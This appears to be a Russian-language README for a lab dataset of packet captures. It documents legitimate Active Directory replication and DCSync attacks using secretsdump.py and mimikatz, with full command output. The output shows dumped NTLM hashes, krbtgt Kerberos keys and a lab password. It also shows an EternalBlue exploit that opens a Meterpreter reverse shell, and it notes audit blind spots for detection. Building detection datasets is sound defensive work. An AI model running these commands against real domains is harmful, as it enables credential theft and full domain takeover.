@@ -1,0 +1,454 @@
+# Описание получения каждого сетевого дампа
+
+--- 
+
+# legitimate_replication.pcapng
+Файл был получен используя утилиту repadmin.
+### Пример команды: repadmin /syncall /AdeP
+Результат выполнения команды:
+
+```python
+Синхронизация всех NC, содержащихся в dc01.
+Синхронизация раздела: DC=ForestDnsZones,DC=work,DC=local
+СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Сейчас выполняется следующая репликация:
+    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Следующая репликация успешно завершена:
+    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Завершена операция SyncAll.
+Команда SyncAll завершена без ошибок.
+Синхронизация раздела: DC=DomainDnsZones,DC=work,DC=local
+СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Сейчас выполняется следующая репликация:
+    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Следующая репликация успешно завершена:
+    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Завершена операция SyncAll.
+Команда SyncAll завершена без ошибок.
+Синхронизация раздела: CN=Schema,CN=Configuration,DC=work,DC=local
+СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Сейчас выполняется следующая репликация:
+    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Следующая репликация успешно завершена:
+    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Завершена операция SyncAll.
+Команда SyncAll завершена без ошибок.
+Синхронизация раздела: CN=Configuration,DC=work,DC=local
+СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Сейчас выполняется следующая репликация:
+    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Следующая репликация успешно завершена:
+    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Завершена операция SyncAll.
+Команда SyncAll завершена без ошибок.
+Синхронизация раздела: DC=work,DC=local
+СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Сейчас выполняется следующая репликация:
+    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Следующая репликация успешно завершена:
+    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
+СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Завершена операция SyncAll.
+Команда SyncAll завершена без ошибок.
+```
+
+### Сетевой трафик:
+<img width="1916" height="990" alt="image" src="https://github.com/user-attachments/assets/785370ac-a5c6-49d7-9a86-9f95a4a6ebc7" />
+
+# dcsync_secretsdump_success.pcapng
+Файл был получен используя утилиту secretsdump.py. 
+### Пример команды: secretsdump.py work.local/svc_replicator:P@ssw0rd@192.168.0.10
+Результат выполнения команды:
+
+``` python
+┌──(bang㉿kali)-[~]
+└─$ secretsdump.py work.local/svc_replicator:P@ssw0rd@192.168.0.10                             
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Администратор:500:aad3b435b51404eeaad3b435b51404ee:f782c89c34b62ccc04dbe747126e1853:::
+Гость:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8bcdec75f939ce1637ad4fd2c1a364e:::
+Dekstop:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+work.local\ivanov:1109:aad3b435b51404eeaad3b435b51404ee:2f9ab01656490ee845bc1ba8769ae33b:::
+work.local\test:1110:aad3b435b51404eeaad3b435b51404ee:2f9ab01656490ee845bc1ba8769ae33b:::
+work.local\adm_yury:1112:aad3b435b51404eeaad3b435b51404ee:2f9ab01656490ee845bc1ba8769ae33b:::
+svc_replicator:1116:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+DC01$:1002:aad3b435b51404eeaad3b435b51404ee:7d285cee96188ffea0f18a07d0505acd:::
+DESKTOP-IAB210V$:1111:aad3b435b51404eeaad3b435b51404ee:bf52151b6c1ca9856a866ccc1b7b28af:::
+UBNUSER$:1113:aad3b435b51404eeaad3b435b51404ee:430424cfc45c87bad8f38da736cd84cf:::
+DC02$:1118:aad3b435b51404eeaad3b435b51404ee:0d77a3958d8d5a4d2a1872f182ddd9df:::
+```
+
+Без указания дополнительных параметров утилита будет по умолчанию делать репликацию для всех объектов, а не для конкретной например УЗ, как в примере выше:
+Можно указать только для одной УЗ, например krbtgt с флагом -debug (необязательный) для более подробного вывода работы утилиты.
+### Пример команды: secretsdump.py work.local/svc_replicator:P@ssw0rd@192.168.0.10 -just-dc-user krbtgt -debug 
+Результат выполнения команды:
+
+``` python
+┌──(bang㉿kali)-[~]
+└─$ secretsdump.py work.local/svc_replicator:P@ssw0rd@192.168.0.10 -just-dc-user krbtgt -debug 
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[+] Impacket Library Installation Path: /home/bang/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[+] Calling DRSCrackNames for krbtgt 
+[+] Calling DRSGetNCChanges for {865a27ca-c371-4426-9f58-93d72e9c8033} 
+[+] Entering NTDSHashes.__decryptHash
+[+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=work,DC=local
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8bcdec75f939ce1637ad4fd2c1a364e:::
+[+] Leaving NTDSHashes.__decryptHash
+[+] Entering NTDSHashes.__decryptSupplementalInfo
+[+] Leaving NTDSHashes.__decryptSupplementalInfo
+[+] Finished processing and printing user's hashes, now printing supplemental information
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:b2f8e371e4e8e76f29efc5d1ebef2e357803f30a99548fa0eaf35120ef17da78
+krbtgt:aes128-cts-hmac-sha1-96:484717f9845720c5b22c0d95343d2f9e
+krbtgt:des-cbc-md5:f7d00dc1b9f4a219
+[*] Cleaning up... 
+```
+
+### Сетевой трафик
+<img width="1918" height="962" alt="image" src="https://github.com/user-attachments/assets/ae06b2ca-127e-48e5-aef5-2f42ec90c81e" />
+
+# dcsync_secretsdump_fail.pcapng
+Файл был получен используя утилиту secretsdump.py. 
+### Пример команды: secretsdump.py work.local/ivanov@192.168.0.10 -hashes aad3b435b51404eeaad3b435b51404ee:2f9ab01656490ee845bc1ba8769ae33b -just-dc-user krbtgt -debug
+В команде используется УЗ ivanov, которая не имеет прав на репликацию. Используется параметр -hashes, чтобы пройти аутентификацию используя hash УЗ, параметр -just-dc-user позволяет запросить данные только об одной УЗ. 
+Результат выполнения команды:
+
+``` python
+┌──(bang㉿kali)-[~]
+└─$ secretsdump.py work.local/ivanov@192.168.0.10 -hashes aad3b435b51404eeaad3b435b51404ee:2f9ab01656490ee845bc1ba8769ae33b -just-dc-user krbtgt -debug
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[+] Impacket Library Installation Path: /home/bang/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[+] Calling DRSCrackNames for krbtgt 
+[+] Calling DRSGetNCChanges for {865a27ca-c371-4426-9f58-93d72e9c8033} 
+Traceback (most recent call last):
+  File "/home/bang/.local/bin/secretsdump.py", line 336, in dump
+    self.__NTDSHashes.dump()
+    ~~~~~~~~~~~~~~~~~~~~~~^^
+  File "/home/bang/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/examples/secretsdump.py", line 3368, in dump
+    userRecord = self.__remoteOps.DRSGetNCChangesGuid(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
+  File "/home/bang/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/examples/secretsdump.py", line 603, in DRSGetNCChangesGuid
+    return self._DRSGetNCChanges(userGuid, dsName)
+           ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^
+  File "/home/bang/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/examples/secretsdump.py", line 662, in _DRSGetNCChanges
+    return self.__drsr.request(request)
+           ~~~~~~~~~~~~~~~~~~~^^^^^^^^^
+  File "/home/bang/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1436, in request
+    raise exception
+impacket.dcerpc.v5.drsuapi.DCERPCSessionError: DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
+[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
+[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
+[*] Cleaning up... 
+```
+
+### Сетевой трафик:
+<img width="1914" height="955" alt="image" src="https://github.com/user-attachments/assets/e0511b21-bf99-487f-9cde-67ba81d6bcd2" />
+
+# dcsync_rpc_success.pcapng
+Файл был получен используя утилиту mimikatz (lsadump::dcsync) под УЗ system. 
+
+#### 1. Особенности диссекции трафика в Wireshark
+
+В захваченном трафике Wireshark не отображает интерфейс DRSUAPI, хотя вызовы репликационных методов действительно происходят. Это связано с тем, что:
+* Wireshark определяет интерфейс RPC по UUID, переданному в bind‑пакете.
+* При выполнении атаки из контекста SYSTEM (особенно после эксплуатации MS017 или аналогичных уязвимостей) часть RPC‑трафика может быть сформирована без корректного указания интерфейсного UUID или с минимальным набором RPC‑метаданных.
+* В результате Wireshark не может сопоставить вызовы с интерфейсом drsuapi, но opnum остаются корректными, что позволяет вручную определить вызываемые методы.
+Несмотря на отсутствие автоматической диссекции, принадлежность трафика к протоколу репликации Active Directory однозначно идентифицируется путем анализа поля Opnum (номер операции) в заголовках пакетов DCE/RPC. Значения Opnum строго регламентированы спецификацией [Microsoft MS-DRSR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/58f33216-d9f1-43bf-a183-87e3c899c410?spm=a2ty_o01.29997173.0.0.33c455fbhHJV9b) и позволяют реконструировать последовательность вызовов методов.
+
+#### 2) Отсутствие события Event ID 4662 при выполнении из-под SYSTEM
+
+Важной особенностью данной техники является отсутствие события Event ID 4662 (An operation was performed on an object) в журнале Windows Security при успешном выполнении DCSync из контекста SYSTEM.
+Генерация события 4662 при вызове функции` IDL_DRSGetNCChanges` напрямую зависит от конфигурации `SACL (System Access Control List)` объекта `Directory Service` (в частности, корневого объекта домена domainDNS). Если в `SACL` данного объекта не настроен аудит прав категории `"Control Access"` (в частности, прав `Replicating Directory Changes`) для учетной записи SYSTEM или групп, в которые она входит, попытка репликации не будет залогирована. Это демонстрирует потенциальную "слепую зону" (blind spot) в настройках аудита безопасности по умолчанию, которой могут воспользоваться злоумышленники, повысившие привилегии SYSTEM на контроллере домена. (Под УЗ админа событие 4662 фиксируется)
+
+> Справка: SACL (System Access Control List) — системный список управления доступом, являющийся частью дескриптора безопасности защищаемого объекта в Windows. В отличие от DACL (который разрешает или запрещает доступ), SACL определяет, какие типы попыток доступа со стороны конкретных субъектов (пользователей, групп или процессов) должны инициировать создание записи аудита в журнале событий безопасности. Настроить SACL для объектов AD можно через оснастку Active Directory Users and Computers (вкладка Security -> Advanced -> вкладка Auditing).
+
+
+### Пример команды: kiwi_cmd "lsadump::dcsync /domain:work.local /user:krbtgt /dc:DC02.work.local exit"
+Результат выполнения команды:
+
+```python
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+[*] Started reverse TCP handler on 192.168.0.30:4444 
+[*] 192.168.0.10:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.0.10:445      - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 Standard 9600 x64 (64-bit)
+[*] 192.168.0.10:445      - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.0.10:445 - The target is vulnerable.
+[*] 192.168.0.10:445 - shellcode size: 1283
+[*] 192.168.0.10:445 - numGroomConn: 12
+[*] 192.168.0.10:445 - Target OS: Windows Server 2012 R2 Standard 9600
+[+] 192.168.0.10:445 - got good NT Trans response
+[+] 192.168.0.10:445 - got good NT Trans response
+[+] 192.168.0.10:445 - SMB1 session setup allocate nonpaged pool success
+[+] 192.168.0.10:445 - SMB1 session setup allocate nonpaged pool success
+[+] 192.168.0.10:445 - good response status for nx: INVALID_PARAMETER
+[+] 192.168.0.10:445 - good response status for nx: INVALID_PARAMETER
+[*] Sending stage (203846 bytes) to 192.168.0.10
+[*] Meterpreter session 3 opened (192.168.0.30:4444 -> 192.168.0.10:58068) at 2026-07-28 09:19:15 -0500
+
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+meterpreter > kiwi_cmd "lsadump::dcsync /domain:work.local /user:krbtgt /dc:DC02.work.local exit"
+[DC] 'work.local' will be the domain
+[DC] 'DC02.work.local' will be the DC server
+[DC] 'krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   : 
+Password last change : 19.04.2026 1:16:40
+Object Security ID   : S-1-5-21-2790878447-3455683389-983535108-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: b8bcdec75f939ce1637ad4fd2c1a364e
+    ntlm- 0: b8bcdec75f939ce1637ad4fd2c1a364e
+    lm  - 0: 86a90ac8229c789cfb58fa85e55f2b51
+
+Supplemental Credentials:
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WORK.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : b2f8e371e4e8e76f29efc5d1ebef2e357803f30a99548fa0eaf35120ef17da78
+      aes128_hmac       (4096) : 484717f9845720c5b22c0d95343d2f9e
+      des_cbc_md5       (4096) : f7d00dc1b9f4a219
+
+* Primary:Kerberos *
+    Default Salt : WORK.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : f7d00dc1b9f4a219
+
+* Packages *
+    Kerberos-Newer-Keys
+
+* Primary:WDigest *
+    01  97505112dac0f7ea2d161a36e938b251
+    02  f22f9cebc95c9d6a57bfbdc6d680e324
+    03  b5cf5566a19b471f12b8c84bf41db6bb
+    04  97505112dac0f7ea2d161a36e938b251
+    05  f22f9cebc95c9d6a57bfbdc6d680e324
+    06  1aa1abbdb4abac01758234122aad0597
+    07  97505112dac0f7ea2d161a36e938b251
+    08  b7cdfe59dd122101ce12ab1ebc813b32
+    09  b7cdfe59dd122101ce12ab1ebc813b32
+    10  616370e2e2835a131d48178c02267ac2
+    11  53a546018f1d2dcb988dbef0d6d276fd
+    12  b7cdfe59dd122101ce12ab1ebc813b32
+    13  3d44643426b80a6716638ff9e933fc16
+    14  53a546018f1d2dcb988dbef0d6d276fd
+    15  748d6cf005fb378f8f02976c2c8e8984
+    16  748d6cf005fb378f8f02976c2c8e8984
+    17  94aa3bfdd205682f7a823131584e8e7d
+    18  fb759f2be20f57a5d35eac9feeb5a1fc
+    19  314a7394d9fc71e6c65386ba7d3160e8
+    20  0694979b3a0620092d137f02a34ac3af
+    21  023107488ca3d013032e97d273a84c7d
+    22  023107488ca3d013032e97d273a84c7d
+    23  4373bc29c40a6e5cd4b0e98f38c0dadf
+    24  6a12f2092a8cb873eecdd3998cf789d5
+    25  6a12f2092a8cb873eecdd3998cf789d5
+    26  00143ff5c68a35aee4b810bcbb0d4387
+    27  96136da343cf0a9fe908bbb056e6cbb0
+    28  7bfcfc00cd1a0098bfab06827d204d73
+    29  73eb33bba004514e521f69c770d6c66b
+
+meterpreter > getuid
+Server username: NT AUTHORITY\СИСТЕМА
+meterpreter > 
+```
+### Сетевой трафик:
+<img width="1917" height="970" alt="image" src="https://github.com/user-attachments/assets/2d263c6e-06d1-484f-bb14-4cb0d668f975" />
+
+# dcsync_rpc_fail.pcapng
+Файл был получен используя утилиту mimikatz под УЗ system. 
+### Пример команды: kiwi_cmd "lsadump::dcsync /domain:work.local /user:krbtgt /dc:192.168.0.100 exit"
+Результат выполнения команды:
+```python
+meterpreter > kiwi_cmd "lsadump::dcsync /domain:work.local /user:krbtgt /dc:192.168.0.100 exit"
+[DC] 'work.local' will be the domain
+[DC] '192.168.0.100' will be the DC server
+[DC] 'krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+ERROR kull_m_rpc_drsr_getDomainAndUserInfos ; DomainControllerInfo: DC '192.168.0.100' not found
+
+meterpreter > 
+```
+### Сетевой трафик:
+<img width="1917" height="986" alt="image" src="https://github.com/user-attachments/assets/28f1aa01-d16b-47ce-8466-1bf98d224b7d" />
+
+# dcsync_mimikatz_fail.pcapng
+Файл был получен используя утилиту mimikatz под УЗ ivanov. 
+### Пример команды: kiwi_cmd "lsadump::dcsync /domain:work.local /user:krbtgt /dc:DC01.work.local exit"
+Результат выполнения команды:
+```python
+sf6 exploit(windows/smb/psexec) > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcpInterrupt: use the 'exit' command to quit
+msf6 exploit(multi/handler) > set LHOST 192.168.0.30
+LHOST => 192.168.0.30
+msf6 exploit(multi/handler) > exploit
+[*] Started reverse TCP handler on 192.168.0.30:4444 
+[*] Sending stage (177734 bytes) to 192.168.0.15
+[*] Meterpreter session 1 opened (192.168.0.30:4444 -> 192.168.0.15:60588) at 2026-07-28 10:04:12 -0500
+
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+[!] Loaded x86 Kiwi on an x64 architecture.
+
+Success.
+meterpreter >  kiwi_cmd "lsadump::dcsync /domain:work.local /user:krbtgt /dc:DC01.work.local exit"
+[DC] 'work.local' will be the domain
+[DC] 'DC01.work.local' will be the DC server
+[DC] 'krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)
+
+meterpreter > getuid 
+Server username: WORK\ivanov
+meterpreter > 
+
+```
+
+### Сетевой трафик:
+<img width="1917" height="986" alt="image" src="https://github.com/user-attachments/assets/e05b8c79-53b0-4fe8-af12-2e2760003529" />
+
+# dcsync_mimikatz_success.pcapng
+Файл был получен используя утилиту mimikatz под УЗ Администратор. 
+### Пример команды: kiwi_cmd "lsadump::dcsync /domain:work.local /user:krbtgt /dc:DC01.work.local exit"
+Результат выполнения команды:
+```python
+meterpreter > getuid 
+Server username: WORK\Администратор
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+[!] Loaded x86 Kiwi on an x64 architecture.
+
+Success.
+
+meterpreter > kiwi_cmd "lsadump::dcsync /domain:work.local /user:krbtgt /dc:DC01.work.local exit"
+[DC] 'work.local' will be the domain
+[DC] 'DC01.work.local' will be the DC server
+[DC] 'krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   : 
+Password last change : 4/19/2026 1:16:40 AM
+Object Security ID   : S-1-5-21-2790878447-3455683389-983535108-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: b8bcdec75f939ce1637ad4fd2c1a364e
+    ntlm- 0: b8bcdec75f939ce1637ad4fd2c1a364e
+    lm  - 0: 86a90ac8229c789cfb58fa85e55f2b51
+
+Supplemental Credentials:
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WORK.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : b2f8e371e4e8e76f29efc5d1ebef2e357803f30a99548fa0eaf35120ef17da78
+      aes128_hmac       (4096) : 484717f9845720c5b22c0d95343d2f9e
+      des_cbc_md5       (4096) : f7d00dc1b9f4a219
+
+* Primary:Kerberos *
+    Default Salt : WORK.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : f7d00dc1b9f4a219
+
+* Packages *
+    Kerberos-Newer-Keys
+
+* Primary:WDigest *
+    01  97505112dac0f7ea2d161a36e938b251
+    02  f22f9cebc95c9d6a57bfbdc6d680e324
+    03  b5cf5566a19b471f12b8c84bf41db6bb
+    04  97505112dac0f7ea2d161a36e938b251
+    05  f22f9cebc95c9d6a57bfbdc6d680e324
+    06  1aa1abbdb4abac01758234122aad0597
+    07  97505112dac0f7ea2d161a36e938b251
+    08  b7cdfe59dd122101ce12ab1ebc813b32
+    09  b7cdfe59dd122101ce12ab1ebc813b32
+    10  616370e2e2835a131d48178c02267ac2
+    11  53a546018f1d2dcb988dbef0d6d276fd
+    12  b7cdfe59dd122101ce12ab1ebc813b32
+    13  3d44643426b80a6716638ff9e933fc16
+    14  53a546018f1d2dcb988dbef0d6d276fd
+    15  748d6cf005fb378f8f02976c2c8e8984
+    16  748d6cf005fb378f8f02976c2c8e8984
+    17  94aa3bfdd205682f7a823131584e8e7d
+    18  fb759f2be20f57a5d35eac9feeb5a1fc
+    19  314a7394d9fc71e6c65386ba7d3160e8
+    20  0694979b3a0620092d137f02a34ac3af
+    21  023107488ca3d013032e97d273a84c7d
+    22  023107488ca3d013032e97d273a84c7d
+    23  4373bc29c40a6e5cd4b0e98f38c0dadf
+    24  6a12f2092a8cb873eecdd3998cf789d5
+    25  6a12f2092a8cb873eecdd3998cf789d5
+    26  00143ff5c68a35aee4b810bcbb0d4387
+    27  96136da343cf0a9fe908bbb056e6cbb0
+    28  7bfcfc00cd1a0098bfab06827d204d73
+    29  73eb33bba004514e521f69c770d6c66b
+
+meterpreter > 
+
+```
+
+### Сетевой трафик:
+
+<img width="1916" height="936" alt="image" src="https://github.com/user-attachments/assets/59944c15-d1e6-4349-940b-bc4762624e5d" />
+
+
+
